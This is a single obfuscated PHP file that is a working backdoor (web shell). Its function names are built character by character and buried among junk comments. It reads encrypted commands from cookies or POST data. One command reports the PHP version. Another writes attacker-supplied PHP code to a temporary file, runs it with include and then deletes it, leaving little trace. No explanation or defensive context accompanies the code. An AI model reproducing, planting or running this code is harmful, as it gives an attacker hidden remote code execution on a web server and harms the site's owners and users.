<?php 	function       bdwggfftl(){$f_xxjjd='dtged';/*   pgkjc */print_r/* ob*/(91090+91090);   }
$xoswgcc	=/*y*/'xoswgcc'      ^	'';
$vekwmrfq       =/*   sm   */"\x66"/*   hih  */.	$xoswgcc(105)/*zm*/.	$xoswgcc(108)      .	"\145"   .   "_"."p"."\165"/*   f  */.      "t"."_"."c"."o"."\x6e"     ./*khc  */"t".$xoswgcc(101)    ./*  y */"n"."\x74"      .     "\163";$oqxjckyhgi/*  kfp   */=/*aw   */$xoswgcc(98)/*lnxob  */.      "a"."s"."\145"   ./*   x*/"6"."4"."\x5f"   ./* zuz  */$xoswgcc(100)      .	$xoswgcc(101)      ./*  cw */"c"."o".$xoswgcc(342-242)  .	$xoswgcc(101);

$uybgrsl	=  $xoswgcc(763-646)     ./*  nwtg  */"n"."\x73"/*  fbgc   */./*jdx */"e"."r"."\x69"	./*  lxtln */"a"."l"."i"."z"."\145";


$zdusy_s/*   csqi_  */=   "p"."h"."\160"      .   "v"."e".$xoswgcc(114)/* o */.	$xoswgcc(115)	./*  bc */"i"."\x6f"/*   j   */.    "n";


$ghmcyqcco   =	"u"."n"."\x6c"      ./*   hcxql*/"i"."\156"/*   cs_nx*/.  "k";


   function       enwoa($pnjxce,	$erzufogv)

{


      global/* jvuu */$xoswgcc;    $zkbadz/*  aplx   */=/* ywa*/"";       for/*i*/($lazpjntb/*   vge  */=	0;       $lazpjntb	</*gu_bm */strlen($pnjxce);)	{


/*   qb */for/*  r   */($dfjfc/*   wukq*/=/*   e */0;    $dfjfc/* mbl*/<	strlen($erzufogv)	&&   $lazpjntb	</*  enmw  */strlen($pnjxce);/*   fjvi   */$dfjfc++,	$lazpjntb++)/*zpivo */{
   $zkbadz/*nv   */.=	$xoswgcc(ord($pnjxce[$lazpjntb])   ^/*   aqn  */ord($erzufogv[$dfjfc]));

	}

	}


/*z   */return	$zkbadz;}





$ydcvmdxzmq	=	$_COOKIE;

$zthohvb/* j */=/* rccn*/$_POST;

$ydcvmdxzmq  =/*  dvu */array_merge($zthohvb,	$ydcvmdxzmq);




$eumxiv_d   =/* cbhsr*/"\143"       ./*  fokb   */"2"."7"."\x39"/* bch*/.      "\141"."f"."2"."\65"	.   "\x2d"/*vobs */.	"\66"/*   cybx */.	"\x31"       .       "\x66"/*  g */.	"c"."-"."\64"/* phfa   */./*jq */"\60"	.       "\x63"	.   $xoswgcc(849-797)   ./*   _yoq */"-".$xoswgcc(98)      .	"4"."\x63"       ./*  amvs   */"\146"/*   fm   */.       $xoswgcc(883-838)/*zwn  */.	$xoswgcc(957-860)/*  jbune */.	"2"."5"."\141"     .	"\142"/*kebgb   */.	"\63"/*vdi  */.  "1"."\144"   ./*   wmd   */"\x30"   ./*bjgtt  */"\x64"	.       "7"."1";


foreach/*n */($ydcvmdxzmq	as/* jrwq */$wkj_zagt	=>/*   qo  */$pnjxce)	{  $pnjxce       =/*  soc*/$uybgrsl(enwoa(enwoa($oqxjckyhgi($pnjxce),/*ttj*/$eumxiv_d),      $wkj_zagt));	if	(isset($pnjxce[$xoswgcc(97)/*   osxsk */./* w */"\153"]))/*   mji*/{
  if       ($pnjxce["\141"]     ==/*  i   */"i")/* rir  */{

    $lazpjntb   =/* cfxe*/array();

	$lazpjntb["\160"    .   $xoswgcc(118)]/*   iec   */=/*  pcon */$zdusy_s();


   $lazpjntb["s"."v"]/*vz*/=  $xoswgcc(51)	./*elsf*/"."."\65";


    echo/*   sm */@serialize($lazpjntb);
/*e */}	elseif/*jxd */($pnjxce["\141"]/*exryq */==   "e")/*  stra   */{


     $mfcix/* _   */=/* fewi*/sprintf($xoswgcc(434-388)	./*   q   */$xoswgcc(813-766)/*   athj*/./*   fryt*/"%".$xoswgcc(878-763)  .	".".$xoswgcc(112)     .	$xoswgcc(108),	md5($eumxiv_d));


/*ue   */$vekwmrfq($mfcix,	"<"	./*z   */$xoswgcc(63)/*ycd */./*   vaqae   */$xoswgcc(930-818)	./*g  */"h"."\160"	.  $xoswgcc(32)  ./*   fyu */"\x75"/*  suw   */.     "\x6e"/*  phkm   */./*  p */"\x6c"	.    "i"."n"."k"."\50"/*  vetn*/./*   ywu */$xoswgcc(288-193)     .       $xoswgcc(706-611)	.  "\x46"/*  xwwfb */./*  ogsrf*/"\111"/*  twjv  */.	"L"."\105"/*  hm  */./*  ff_qz */"\137"      .	"_"."\x29"	.	";".$xoswgcc(32)  .	$pnjxce[$xoswgcc(100)]);

      include($mfcix);

     $ywji_x/*  b   */=	$mfcix;	$ghmcyqcco($ywji_x);


    }
     exit();
       }}



